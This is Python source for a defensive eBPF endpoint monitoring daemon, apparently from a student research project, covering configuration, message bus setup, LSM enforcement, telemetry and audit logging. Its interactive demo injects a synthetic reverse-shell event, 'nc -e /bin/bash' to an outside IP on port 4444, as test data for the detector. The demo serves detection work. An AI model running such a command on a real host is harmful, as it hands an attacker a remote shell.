"""
LAAX Component 1: Autonomous Adaptive eBPF Endpoint Agent Daemon.
Student: Amantha M.A (IT23184312) | Research Project: J26-CS-310

This is the primary production entrypoint for Component 1. It operates either as:
  1. A standalone endpoint daemon (monitoring the live host via eBPF on Linux/WSL2)
  2. A distributed network agent (connecting to a remote LAAX TCP message broker)
  3. An interactive demonstration runner for supervisor & panel reviews

Usage:
    # Run auto-detecting environment (eBPF on Linux, simulated on Windows):
    python laax_agent.py

    # Run on real Linux kernel with eBPF LSM enforcement:
    sudo python laax_agent.py --mode ebpf --lsm --export telemetry.csv

    # Run in interactive mode for live demo / viva presentation:
    python laax_agent.py --interactive

    # Connect to a multi-component distributed TCP broker:
    LAAX_BUS_TOKEN=<secret> python laax_agent.py --bus tcp --broker 127.0.0.1:5599

    # Everything from one declarative file (NFR5); CLI flags override it:
    sudo laax-agent --config /etc/laax/agent.conf

    # Production bus: protobuf over ZeroMQ, CURVE-authenticated:
    laax-agent --bus zmq --curve-key /etc/laax/curve/agent.key_secret \
               --curve-server-key /etc/laax/curve/server.key

Other commands:
    laax-agent check [--config FILE]      can this host run the agent?
    laax-agent status                     state of the running agent
    laax-agent keygen DIR [--server|--name NAME]   CURVE keys for the bus
    laax-agent verify-audit [FILE]        check the audit log's hash chain
    laax-agent version
"""

from __future__ import annotations

import argparse
import asyncio
import json
import os
import signal
import sys
import time
from typing import Any, Dict, Optional

from laax.backend import SimulatedBackend
from laax.bus import Bus, InProcBus, TcpBus
from laax.contracts import ExternalAlert, HostEvent, Topic
from services.c1_agent import C1Agent, ModeController
from services.c1_audit import AuditLog
from services.c1_telemetry import TelemetryCsvExporter

__version__ = "0.2.0"
DEFAULT_STATUS_FILE = "/run/laax/status.json"


# --------------------------------------------------------------------------
# Declarative configuration (NFR5)
# --------------------------------------------------------------------------
class ConfigError(ValueError):
    pass


# (section, key) -> (argparse dest, accepted types). Anything not listed is an
# error: a typo in a security agent's config must not be silently ignored.
CONFIG_KEYS: Dict[tuple, tuple] = {
    ("agent", "host_id"): ("host_id", (str,)),
    ("agent", "host_ip"): ("host_ip", (str,)),
    ("agent", "mode"): ("mode", (str,)),
    ("agent", "enable_lsm"): ("lsm", (bool,)),
    ("agent", "baseline_seconds"): ("baseline", (int, float)),
    ("agent", "allow_fallback"): ("allow_fallback", (bool,)),
    ("agent", "require_lsm"): ("require_lsm", (bool,)),
    ("agent", "loader_path"): ("loader", (str,)),
    ("agent", "status_file"): ("status_file", (str,)),
    ("agent", "observe"): ("observe", (bool,)),
    ("agent", "score_log"): ("score_log", (str,)),
    ("thresholds", "theta_up"): ("theta_up", (int, float)),
    ("thresholds", "theta_down"): ("theta_down", (int, float)),
    ("thresholds", "min_dwell_seconds"): ("dwell", (int, float)),
    ("thresholds", "decay_rate"): ("decay", (int, float)),
    ("thresholds", "inheritance_factor"): ("inherit", (int, float)),
    ("bus", "type"): ("bus", (str,)),
    ("bus", "broker_host"): ("broker_host", (str,)),
    ("bus", "broker_port"): ("broker_port", (int,)),
    ("bus", "token"): ("token", (str,)),
    ("bus", "zmq_pub"): ("zmq_pub", (str,)),
    ("bus", "zmq_sub"): ("zmq_sub", (str,)),
    ("bus", "curve_secret_key"): ("curve_key", (str,)),
    ("bus", "curve_server_key"): ("curve_server_key", (str,)),
    ("telemetry", "enabled"): ("telemetry_enabled", (bool,)),
    ("telemetry", "export_path"): ("export", (str,)),
    ("telemetry", "schema"): ("telemetry_schema", (str,)),
    ("audit", "path"): ("audit", (str,)),
}


def load_config(path: str) -> Dict[str, Any]:
    """Read the JSON agent config and return argparse defaults."""
    try:
        with open(path, encoding="utf-8") as fh:
            raw = json.load(fh)
    except (OSError, json.JSONDecodeError) as exc:
        raise ConfigError(f"{path}: {exc}") from exc
    if not isinstance(raw, dict):
        raise ConfigError(f"{path}: top level must be an object")

    out: Dict[str, Any] = {}
    for section, body in raw.items():
        if not isinstance(body, dict):
            raise ConfigError(f"{path}: section {section!r} must be an object")
        for key, value in body.items():
            spec = CONFIG_KEYS.get((section, key))
            if spec is None:
                raise ConfigError(f"{path}: unknown setting {section}.{key}")
            dest, types = spec
            # bool is an int in Python; do not accept true as a threshold.
            if isinstance(value, bool) and bool not in types:
                raise ConfigError(f"{path}: {section}.{key} must be a number")
            if not isinstance(value, types):
                raise ConfigError(f"{path}: {section}.{key} has the wrong type")
            out[dest] = value

    if out.pop("telemetry_schema", "C3_26_column_csv") != "C3_26_column_csv":
        raise ConfigError(f"{path}: telemetry.schema must be C3_26_column_csv")
    if out.pop("telemetry_enabled", True) is False:
        out["export"] = None
    host, port = out.pop("broker_host", None), out.pop("broker_port", None)
    if host is not None or port is not None:
        out["broker"] = f"{host or '127.0.0.1'}:{port or 5599}"
    return out


def validate(args: argparse.Namespace) -> None:
    if args.mode not in ("auto", "ebpf", "simulated"):
        raise ConfigError(f"mode must be auto|ebpf|simulated, not {args.mode!r}")
    if args.bus not in ("inproc", "tcp", "zmq"):
        raise ConfigError(f"bus must be inproc|tcp|zmq, not {args.bus!r}")
    if bool(args.curve_key) != bool(args.curve_server_key):
        raise ConfigError("CURVE needs both curve_secret_key and curve_server_key")
    if not args.theta_down < args.theta_up:
        raise ConfigError("hysteresis requires theta_down < theta_up")
    if not 0.0 < args.decay < 1.0:
        raise ConfigError("decay_rate must be in (0, 1)")
    if not 0.0 <= args.inherit <= 1.0:
        raise ConfigError("inheritance_factor must be in [0, 1]")


class SyntheticLiveSource:
    """
    Continuous host event generator for development, testing, and presentation.
    Simulates ongoing background system activity with realistic event intervals.
    """

    def __init__(self, host_id: str = "host-0") -> None:
        self.host_id = host_id
        self._queue: asyncio.Queue[HostEvent] = asyncio.Queue()
        self._running = True
        self._pid_counter = 1200

    def __aiter__(self):
        return self

    async def __anext__(self) -> HostEvent:
        return await self._queue.get()

    def inject(
        self,
        comm: str,
        kind: str = "exec",
        ppid: int = 1,
        pid: Optional[int] = None,
        daddr: Optional[str] = None,
        dport: Optional[int] = None,
        argv: Optional[list[str]] = None,
        pcomm: Optional[str] = None,
    ) -> HostEvent:
        if pid is None:
            self._pid_counter += 1
            pid = self._pid_counter
        ev = HostEvent(
            host_id=self.host_id,
            pid=pid,
            ppid=ppid,
            comm=comm,
            kind=kind,
            daddr=daddr,
            dport=dport,
            argv=argv,
            source="synthetic_live",
        )
        if pcomm:
            setattr(ev, "comm_parent", pcomm)
        self._queue.put_nowait(ev)
        return ev

    async def background_activity_loop(self) -> None:
        """Simulates periodic benign host background tasks."""
        benign_tasks = [
            ("systemd-journal", "exec", 1, None, None, None, "systemd"),
            ("cron", "exec", 1, None, None, None, "systemd"),
            ("update-notifier", "exec", 1, None, None, None, "systemd"),
            ("sshd", "connect", 1, "10.0.0.1", 22, None, "systemd"),
            ("dnsmasq", "connect", 1, "8.8.8.8", 53, None, "systemd"),
        ]
        idx = 0
        while self._running:
            await asyncio.sleep(2.0)
            comm, kind, ppid, daddr, dport, argv, pcomm = benign_tasks[idx % len(benign_tasks)]
            idx += 1
            self.inject(comm=comm, kind=kind, ppid=ppid, daddr=daddr, dport=dport, argv=argv, pcomm=pcomm)

    def stop(self) -> None:
        self._running = False


class AgentRunner:
    def __init__(self, args: argparse.Namespace) -> None:
        self.args = args
        self.bus: Optional[Bus] = None
        self.agent: Optional[C1Agent] = None
        self.exporter: Optional[TelemetryCsvExporter] = None
        self.source = None
        self.loader = None
        self.tasks: list[asyncio.Task] = []
        self._stop_event = asyncio.Event()
        self._shut_down = False
        self._last_pid: Optional[int] = None    # target for demo E(t) / LSM
        self.lsm_active = bool(args.lsm)
        self.audit = AuditLog(args.audit, host_id=args.host_id)
        self.started = time.time()
        self.score_log = None
        if args.score_log:
            from services.c1_scorelog import ScoreLog
            self.score_log = ScoreLog(args.score_log)

    async def setup(self) -> None:
        # 1. Bus setup
        if self.args.bus == "zmq":
            from laax.zbus import CurveClient, ZmqBus
            curve = None
            if self.args.curve_key:
                curve = CurveClient.from_files(self.args.curve_key, self.args.curve_server_key)
            else:
                print("[!] WARNING: ZeroMQ bus without CURVE -- unencrypted, and any "
                      "process that reaches the broker can command this agent.")
            print(f"[*] Initializing ZeroMQ/protobuf bus: pub {self.args.zmq_pub}, "
                  f"sub {self.args.zmq_sub}, auth {'CURVE' if curve else 'NONE'}")
            self.bus = ZmqBus(self.args.zmq_pub, self.args.zmq_sub, curve=curve)
        elif self.args.bus == "tcp":
            host, port_str = self.args.broker.rsplit(":", 1)
            print(f"[*] Initializing TCP Bus connected to broker {host}:{port_str}...")
            if not self.args.token:
                print("[!] WARNING: no bus token -- the broker must be running with "
                      "--insecure, and any local user can command this agent.")
            self.bus = TcpBus(host=host, port=int(port_str), token=self.args.token)
        else:
            print("[*] Initializing In-Process Bus...")
            self.bus = InProcBus(trace=self.args.trace)

        # 2. Kernel Backend & Source selection
        is_linux = sys.platform.startswith("linux")
        can_bpf = False
        if is_linux:
            from services.ebpf_source import can_load_bpf
            can_bpf = can_load_bpf()
        use_ebpf = (self.args.mode == "ebpf") or (self.args.mode == "auto" and can_bpf)

        if use_ebpf:
            from services.ebpf_source import EbpfBackend, EbpfKernelSource, EbpfLoader, LoaderUnavailable
            lsm = bool(self.args.lsm)
            if lsm:
                # Without bpf in the active LSM list the LSM program fails to
                # load and takes the whole object with it. Degrade to telemetry
                # only -- loudly, and on the record -- unless told not to.
                from services.c1_preflight import lsm_status
                ok, detail = lsm_status()
                if not ok:
                    if self.args.require_lsm:
                        self.audit.write("agent_start_failed", reason=f"BPF LSM unavailable: {detail}")
                        raise SystemExit(f"[-] BPF LSM unavailable ({detail}) and require_lsm is set.")
                    print(f"[!] BPF LSM unavailable ({detail}): running WITHOUT enforcement; "
                          f"C4 requests will be refused.")
                    self.audit.write("lsm_unavailable", detail=detail)
                    lsm = False
            self.lsm_active = lsm
            print(f"[*] Starting eBPF Kernel Loader (LSM={'ON' if lsm else 'OFF'})...")
            try:
                self.loader = EbpfLoader(path=self.args.loader, lsm=lsm)
                await self.loader.start()
                self.source = EbpfKernelSource(self.loader, host_id=self.args.host_id)
                backend = EbpfBackend(self.loader)
                print("[+] eBPF Kernel Source successfully attached to kernel ring buffer!")
            except LoaderUnavailable as exc:
                print(f"[!] Cannot start eBPF loader: {exc}")
                self._fallback_or_die(str(exc))
                self.source = SyntheticLiveSource(host_id=self.args.host_id)
                backend = SimulatedBackend()
        else:
            if self.args.mode == "ebpf":
                print("[!] eBPF mode requested but cannot run (requires Linux root).")
                self._fallback_or_die("requires Linux and root")
            else:
                print(f"[*] Initializing Simulated/Host Tracing Engine (mode={self.args.mode})...")
            self.source = SyntheticLiveSource(host_id=self.args.host_id)
            backend = SimulatedBackend()

        # 3. Mode Controller setup
        controller = ModeController(
            theta_up=self.args.theta_up,
            theta_down=self.args.theta_down,
            min_dwell_s=self.args.dwell,
            decay=self.args.decay,
            inherit=self.args.inherit,
        )

        # 4. Agent instance
        self.agent = C1Agent(
            bus=self.bus,
            source=self.source,
            host_id=self.args.host_id,
            controller=controller,
            backend=backend,
            audit=self.audit,
            observe=self.args.observe,
            score_log=self.score_log,
        )
        if self.args.observe:
            print("[*] OBSERVE mode: scoring and logging only; tracing depth never changes.")
        self.audit.write(
            "agent_start", backend=backend.__class__.__name__,
            source=self.source.__class__.__name__,
            latency_source="measured" if getattr(backend, "measured", False) else "modelled",
            lsm=bool(getattr(backend, "enforcement_available", False)) and self.lsm_active,
            config=self.args.config,
            theta_up=self.args.theta_up, theta_down=self.args.theta_down,
            min_dwell_s=self.args.dwell)

        # 5. Telemetry Exporter
        if self.args.export:
            print(f"[*] Enabling C3 Telemetry CSV Exporter -> {self.args.export}")
            self.exporter = TelemetryCsvExporter(
                bus=self.bus,
                path=self.args.export,
                host_ips={self.args.host_id: self.args.host_ip},
                theta_up=self.args.theta_up,
                theta_down=self.args.theta_down,
            )

    def _fallback_or_die(self, reason: str) -> None:
        """
        A security agent that cannot see the kernel must say so, not carry on.
        Falling back silently meant a systemd service reported "active" while
        writing synthetic events into the real telemetry file. Explicit eBPF
        mode now fails; auto mode, or allow_fallback, may still fall back.
        """
        if self.args.mode == "ebpf" and not self.args.allow_fallback:
            self.audit.write("agent_start_failed", reason=reason)
            raise SystemExit(f"[-] eBPF backend unavailable ({reason}); refusing to "
                             f"run on synthetic data. Use --allow-fallback to override.")
        print("[!] FALLING BACK TO SYNTHETIC EVENTS -- this run observes nothing real.")

    async def run(self) -> None:
        await self.setup()
        assert self.bus and self.agent

        if hasattr(self.bus, "start"):
            # ZeroMQ: connect and let CURVE handshakes and subscriptions settle
            # before the first publish (PUB/SUB drops to unconnected peers).
            await self.bus.start()
        self.tasks.append(asyncio.create_task(self.bus.run(), name="bus"))
        self.tasks.append(asyncio.create_task(self.agent.run(), name="agent"))
        self.tasks.append(asyncio.create_task(self.agent.decay_loop(), name="decay"))
        self.tasks.append(asyncio.create_task(self._status_loop(), name="status"))

        if isinstance(self.source, SyntheticLiveSource):
            self.tasks.append(asyncio.create_task(self.source.background_activity_loop(), name="bg_activity"))

        print("\n" + "=" * 65)
        print("  LAAX Component 1: Adaptive eBPF Endpoint Agent Active")
        print(f"  Host: {self.args.host_id} ({self.args.host_ip}) | Backend: {self.agent.backend.__class__.__name__}")
        print(f"  Thresholds: theta_up={self.args.theta_up}, theta_down={self.args.theta_down}, dwell={self.args.dwell}s")
        print("=" * 65 + "\n")

        # Baseline learning window
        if self.args.baseline > 0:
            print(f"[*] Calibrating benign baseline profile for {self.args.baseline:.1f} seconds...")
            await asyncio.sleep(self.args.baseline)
            self.agent.scorer.freeze()
            print(f"[+] Baseline frozen: {len(self.agent.scorer.counts['lineage'])} lineage pairs, "
                  f"{len(self.agent.scorer.counts['egress'])} egress pairs learned.\n")

        if self.args.interactive and isinstance(self.source, SyntheticLiveSource):
            await self._run_interactive_loop()
        else:
            await self._run_daemon_loop()

    def status(self) -> Dict[str, Any]:
        st = self.agent.stats() if self.agent else {}
        return {
            "version": __version__,
            "state": "stopped" if self._shut_down else "running",
            "pid": os.getpid(),
            "updated": time.time(),
            "uptime_s": round(time.time() - self.started, 1),
            "host_id": self.args.host_id,
            "backend": self.agent.backend.__class__.__name__ if self.agent else None,
            "source": self.source.__class__.__name__ if self.source else None,
            "enforcement": bool(self.lsm_active and self.agent and
                                getattr(self.agent.backend, "enforcement_available", False)),
            "bus": self.args.bus,
            "baseline_learning": bool(self.agent and self.agent.scorer.learning),
            "ring_buffer_drops": self.loader.drops if self.loader else None,
            "telemetry_rows": self.exporter.rows if self.exporter else None,
            "stats": st,
        }

    def _write_status(self) -> None:
        """Atomic, so `laax-agent status` never reads half a file."""
        path = self.args.status_file
        if not path:
            return
        try:
            os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
            tmp = f"{path}.tmp"
            with open(tmp, "w", encoding="utf-8") as fh:
                json.dump(self.status(), fh, indent=1, default=str)
            # Readable by everyone (the service umask is 027): it holds counters
            # and state, nothing secret, and `laax-agent status` runs unprivileged.
            os.chmod(tmp, 0o644)
            os.replace(tmp, path)
        except OSError as exc:
            print(f"[!] cannot write status file {path}: {exc}; disabling it")
            self.args.status_file = None

    async def _status_loop(self, every: float = 5.0) -> None:
        while not self._stop_event.is_set():
            if self.loader:
                await self.loader.refresh_drops()
            if self.exporter:
                self.exporter.flush()          # bounds an idle agent's unflushed tail
            self._write_status()
            await asyncio.sleep(every)

    def reopen_logs(self) -> None:
        """SIGHUP from logrotate: start a fresh telemetry file. The audit log
        is not rotated -- it is low-volume and its hash chain is one file."""
        if self.exporter:
            self.exporter.reopen()
            print("[*] SIGHUP: telemetry file reopened")
            self.audit.write("telemetry_reopened", path=self.args.export)

    async def _run_daemon_loop(self) -> None:
        print("[*] Agent running in autonomous background daemon mode.")
        print("[*] Press Ctrl+C to terminate cleanly and view statistics.\n")
        try:
            while not self._stop_event.is_set():
                await asyncio.sleep(self.args.heartbeat)
                st = self.agent.stats()
                print(f"[Heartbeat] events={st['events_emitted']} | tracked_procs={st['processes_tracked']} | "
                      f"mode_switches={st['mode_switches']} | duty_cycle={st['duty_cycle_pct']}% | "
                      f"latency_source={st['latency_source']}", flush=True)
        except asyncio.CancelledError:
            pass

    async def _run_interactive_loop(self) -> None:
        print("\n" + "-" * 65)
        print("  INTERACTIVE DEMO CONSOLE (Press a key to inject scenario events):")
        print("    [1] Inject Benign Process (e.g., /usr/bin/git status) -> Stays in LIGHT mode")
        print("    [2] Inject Suspicious Process (unusual lineage) -> Scores increase")
        print("    [3] Inject Attack Reverse Shell (bash -> nc -e) -> Escalates to DEEP mode")
        print("    [4] Inject C3 External Alert E(t) -> Cross-domain correlation boost")
        print("    [5] Inject C4 LSM Execve Denial -> Surgical process containment")
        print("    [s] Print detailed agent runtime statistics")
        print("    [q] Graceful shutdown and generate final report")
        print("-" * 65 + "\n")

        loop = asyncio.get_running_loop()
        while not self._stop_event.is_set():
            sys.stdout.write("agent-console> ")
            sys.stdout.flush()
            cmd = await loop.run_in_executor(None, sys.stdin.readline)
            if not cmd:
                break
            cmd = cmd.strip()

            # E(t) and LSM target the last process injected by [2] or [3]: they
            # must name a pid C1 has actually seen, as the real C3 and C4 do.
            if cmd == "1":
                print(">> [Inject] Spawning benign process: git status (parent: bash)")
                self.source.inject("git", kind="exec", ppid=1001, argv=["git", "status"], pcomm="bash")
            elif cmd == "2":
                print(">> [Inject] Spawning unusual chain: whoami (parent: apache2)")
                ev = self.source.inject("whoami", kind="exec", ppid=8080,
                                        argv=["/usr/bin/whoami"], pcomm="apache2")
                self._last_pid = ev.pid
            elif cmd == "3":
                print(">> [Inject] Spawning malicious reverse shell: nc -e /bin/bash (parent: apache2)")
                ev = self.source.inject(
                    "nc", kind="exec", ppid=8080,
                    daddr="66.42.13.90", dport=4444,
                    argv=["/bin/nc", "-e", "/bin/bash", "66.42.13.90", "4444"],
                    pcomm="apache2"
                )
                self._last_pid = ev.pid
            elif cmd in ("4", "5") and self._last_pid is None:
                print("   Inject a process with [2] or [3] first; E(t) and LSM need a pid C1 has seen.")
            elif cmd == "4":
                print(f">> [Inject] Simulating C3 External Alert E(t) for pid {self._last_pid} (boost=+8.0)")
                alert = ExternalAlert(
                    host_id=self.args.host_id,
                    pid=self._last_pid,
                    boost=8.0,
                    reason="IoT pivot correlation detected by C3 GNN",
                )
                await self.bus.publish(Topic.EXTERNAL_ALERT, alert)
            elif cmd == "5":
                print(f">> [Inject] Simulating C4 EnforceHost containment for pid {self._last_pid} "
                      f"(deny execve, lease 6s)")
                from laax.contracts import EnforceHost
                enforce = EnforceHost(
                    policy_id="pol-demo-01",
                    host_id=self.args.host_id,
                    pid=self._last_pid,
                    syscall="execve",
                    lease_seconds=6.0,
                )
                await self.bus.publish(Topic.ENFORCE_HOST, enforce)
            elif cmd.lower() == "s":
                self.print_stats()
            elif cmd.lower() in ("q", "quit", "exit"):
                break
            else:
                print("Unknown command. Enter 1-5, s, or q.")
            await asyncio.sleep(0.1)

    def print_stats(self) -> None:
        if not self.agent:
            return
        print("\n" + "=" * 55)
        print("  COMPONENT 1 ADAPTIVE AGENT STATISTICS")
        print("=" * 55)
        st = self.agent.stats()
        for k, v in st.items():
            print(f"  {k:<28} {v}")
        print("=" * 55 + "\n")

    async def shutdown(self) -> None:
        # Reached from both the signal handler and run()'s finally block.
        if self._shut_down:
            return
        self._shut_down = True
        print("\n[*] Shutting down Component 1 Agent...")
        self._stop_event.set()
        for t in self.tasks:
            t.cancel()
        if self.exporter:
            self.exporter.close()
            print(f"[+] Closed telemetry exporter. Rows written: {self.exporter.rows}")
        if self.loader:
            await self.loader.stop()
            print("[+] Stopped eBPF loader cleanly.")
        if self.bus is not None and hasattr(self.bus, "close"):
            self.bus.close()
        if self.agent:
            self.audit.write("agent_stop", stats=self.agent.stats())
            self._write_status()
        if self.score_log:
            self.score_log.close()
            print(f"[+] Score log: {self.score_log.records} records -> {self.args.score_log}")
        self.audit.close()
        self.print_stats()


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description="LAAX Component 1: Adaptive eBPF Endpoint Agent Daemon")
    p.add_argument("--config", metavar="FILE",
                   help="JSON agent config (deploy/laax-agent.conf); CLI flags override it")
    p.add_argument("--allow-fallback", action="store_true",
                   help="with --mode ebpf, run on synthetic events if the kernel side fails")
    p.add_argument("--require-lsm", action="store_true",
                   help="with --lsm, fail instead of running without enforcement")
    p.add_argument("--loader", metavar="PATH",
                   help="laax-loader binary (default: $LAAX_LOADER, ebpf/, /usr/lib/laax/)")
    p.add_argument("--status-file", metavar="PATH", default=None,
                   help="write agent status JSON here every 5 s (read by `laax-agent status`)")
    p.add_argument("--heartbeat", type=float, default=5.0,
                   help="seconds between heartbeat lines in daemon mode")
    p.add_argument("--observe", action="store_true",
                   help="calibration: score and log every event, never change tracing depth")
    p.add_argument("--score-log", metavar="JSONL",
                   help="write every scored event here (input to benchmarks/roc_eval.py)")
    p.add_argument("--audit", metavar="JSONL",
                   help="append the hash-chained audit log (FR7) to this file")
    p.add_argument("--token", default=os.environ.get("LAAX_BUS_TOKEN"),
                   help="bus authentication token for --bus tcp (default: $LAAX_BUS_TOKEN)")
    p.add_argument("--decay", type=float, default=0.6,
                   help="confidence decay per 0.5 s tick in deep mode (default: 0.6)")
    p.add_argument("--inherit", type=float, default=0.7,
                   help="share of parent confidence a child starts with (default: 0.7)")
    p.add_argument("--mode", choices=["auto", "ebpf", "simulated"], default="auto",
                   help="Tracing execution backend (default: auto)")
    p.add_argument("--bus", choices=["inproc", "tcp", "zmq"], default="inproc",
                   help="inproc (standalone), zmq (protobuf over ZeroMQ, production), "
                        "tcp (JSON lines, development)")
    p.add_argument("--zmq-pub", default="tcp://127.0.0.1:5600",
                   help="zmq: broker endpoint to publish to")
    p.add_argument("--zmq-sub", default="tcp://127.0.0.1:5601",
                   help="zmq: broker endpoint to subscribe from")
    p.add_argument("--curve-key", metavar="FILE",
                   help="zmq: this agent's CURVE secret key file (*.key_secret)")
    p.add_argument("--curve-server-key", metavar="FILE",
                   help="zmq: the broker's CURVE public key file (server.key)")
    p.add_argument("--broker", default="127.0.0.1:5599",
                   help="TCP Broker endpoint host:port (when --bus tcp)")
    p.add_argument("--host-id", default="host-0", help="Host identifier (default: host-0)")
    p.add_argument("--host-ip", default="10.0.0.12", help="Host IP address for telemetry (default: 10.0.0.12)")
    p.add_argument("--baseline", type=float, default=5.0, help="Benign baseline window in seconds (default: 5.0)")
    p.add_argument("--theta-up", type=float, default=7.0, help="Deep mode escalation threshold (default: 7.0)")
    p.add_argument("--theta-down", type=float, default=4.0, help="Light mode de-escalation threshold (default: 4.0)")
    p.add_argument("--dwell", type=float, default=3.0, help="Minimum deep mode dwell time in seconds (default: 3.0)")
    p.add_argument("--lsm", action="store_true", help="Enable eBPF LSM surgical denial hook")
    p.add_argument("--export", metavar="CSV_FILE", help="Continuously write C3 telemetry CSV to this file")
    p.add_argument("--interactive", "-i", action="store_true",
                   help="Launch interactive demonstration mode with event injection")
    p.add_argument("--trace", action="store_true", help="Log every bus message to stdout")
    return p


def parse_run_args(argv) -> argparse.Namespace:
    parser = build_parser()
    args = parser.parse_args(argv)
    if args.config:
        # Config values become defaults; anything given on the command line
        # still wins.
        parser.set_defaults(**load_config(args.config))
        args = parser.parse_args(argv)
    validate(args)
    return args


async def run_agent(args: argparse.Namespace) -> int:
    runner = AgentRunner(args)
    loop = asyncio.get_running_loop()
    main_task = asyncio.current_task()
    for sig in (signal.SIGINT, signal.SIGTERM):
        try:
            # Cancel the main task: shutdown() runs in its finally block, so
            # systemd's stop does not wait out a heartbeat sleep.
            loop.add_signal_handler(sig, main_task.cancel)
        except NotImplementedError:
            pass  # Windows event loop does not support add_signal_handler
    try:
        loop.add_signal_handler(signal.SIGHUP, runner.reopen_logs)
    except (NotImplementedError, AttributeError):
        pass

    try:
        await runner.run()
    except asyncio.CancelledError:
        pass
    finally:
        await runner.shutdown()
    return 0


# --------------------------------------------------------------------------
# Subcommands other than `run`
# --------------------------------------------------------------------------
def cmd_check(argv) -> int:
    p = argparse.ArgumentParser(prog="laax-agent check",
                                description="Can this host run the agent, and with what?")
    p.add_argument("--config")
    p.add_argument("--loader")
    a = p.parse_args(argv)
    from services.c1_preflight import report, run_checks
    loader = a.loader
    if a.config:
        try:
            cfg = load_config(a.config)
        except ConfigError as exc:
            print(f"  FAIL  config          {exc}")
            return 1
        loader = loader or cfg.get("loader")
    print(f"LAAX Component 1 agent {__version__} -- preflight\n")
    return report(run_checks(config_path=a.config, loader_path=loader))


def cmd_status(argv) -> int:
    p = argparse.ArgumentParser(prog="laax-agent status")
    p.add_argument("--status-file", default=DEFAULT_STATUS_FILE)
    p.add_argument("--json", action="store_true", help="print the raw status JSON")
    a = p.parse_args(argv)
    try:
        with open(a.status_file, encoding="utf-8") as fh:
            st = json.load(fh)
    except (OSError, json.JSONDecodeError) as exc:
        print(f"no agent status at {a.status_file} ({exc}). Is the agent running?")
        return 3
    if a.json:
        print(json.dumps(st, indent=2))
        return 0
    age = time.time() - st.get("updated", 0)
    alive = st.get("state") == "running" and age < 15
    try:
        os.kill(st["pid"], 0)
    except PermissionError:
        pass            # exists, owned by root: an unprivileged caller may not signal it
    except (OSError, KeyError, TypeError):
        alive = False
    s = st.get("stats", {})
    print(f"  state              {'running' if alive else 'NOT RUNNING'} "
          f"(pid {st.get('pid')}, updated {age:.0f}s ago)")
    for label, value in (
            ("version", st.get("version")),
            ("uptime", f"{st.get('uptime_s', 0):.0f}s"),
            ("backend", f"{st.get('backend')} ({s.get('latency_source')})"),
            ("source", st.get("source")),
            ("enforcement", "on" if st.get("enforcement") else "OFF"),
            ("bus", st.get("bus")),
            ("baseline", "learning" if st.get("baseline_learning") else "frozen"),
            ("events", s.get("events_emitted")),
            ("processes", s.get("processes_tracked")),
            ("mode switches", s.get("mode_switches")),
            ("probe attaches", s.get("kprobe_attach_events")),
            ("duty cycle", f"{s.get('duty_cycle_pct')}%"),
            ("ring-buffer drops", st.get("ring_buffer_drops")),
            ("LSM policies", s.get("lsm_policies_active")),
            ("audit records", s.get("audit_records"))):
        print(f"  {label:<18} {value}")
    return 0 if alive else 3


def cmd_keygen(argv) -> int:
    p = argparse.ArgumentParser(
        prog="laax-agent keygen",
        description="Create CURVE keys for the ZeroMQ bus. Run once with --server on "
                    "the broker host, then once per component.")
    p.add_argument("directory")
    p.add_argument("--name", default="agent", help="key name (default: agent)")
    p.add_argument("--server", action="store_true",
                   help="create the broker keypair and the clients/ allow-list")
    a = p.parse_args(argv)
    from laax.zbus import generate_keypair
    name = "server" if a.server else a.name
    target_public = os.path.join(a.directory, f"{name}.key")
    if os.path.exists(target_public):
        print(f"{target_public} exists; refusing to overwrite a key in use.")
        return 1
    public, secret = generate_keypair(a.directory, name)
    print(f"  public  {public}")
    print(f"  secret  {secret}  (mode 600 -- never copy this off the host)")
    if a.server:
        clients = os.path.join(a.directory, "clients")
        os.makedirs(clients, mode=0o755, exist_ok=True)
        print(f"\n  allow-list: {clients}/")
        print("  Copy each component's <name>.key there; give every component server.key.")
    else:
        print(f"\n  On the broker host: copy {public} into <curve-dir>/clients/")
        print("  Then set bus.curve_secret_key and bus.curve_server_key in the agent config.")
    return 0


def cmd_verify_audit(argv) -> int:
    p = argparse.ArgumentParser(prog="laax-agent verify-audit")
    p.add_argument("file", nargs="?", default="/var/log/laax/audit.jsonl")
    a = p.parse_args(argv)
    from services.c1_audit import verify
    ok, _n, msg = verify(a.file)
    print(msg)
    return 0 if ok else 1


COMMANDS = {
    "check": cmd_check,
    "status": cmd_status,
    "keygen": cmd_keygen,
    "verify-audit": cmd_verify_audit,
}


def main(argv=None) -> int:
    """laax-agent [run] [options] | check | status | keygen | verify-audit | version"""
    argv = list(sys.argv[1:] if argv is None else argv)
    if argv and argv[0] in ("version", "--version"):
        print(f"laax-agent {__version__}")
        return 0
    if argv and argv[0] in COMMANDS:
        return COMMANDS[argv[0]](argv[1:])
    if argv and argv[0] == "run":
        argv = argv[1:]
    try:
        args = parse_run_args(argv)
    except ConfigError as exc:
        print(f"[-] configuration error: {exc}")
        return 2
    return asyncio.run(run_agent(args))


def cli_entry() -> None:
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(0)


if __name__ == "__main__":
    cli_entry()
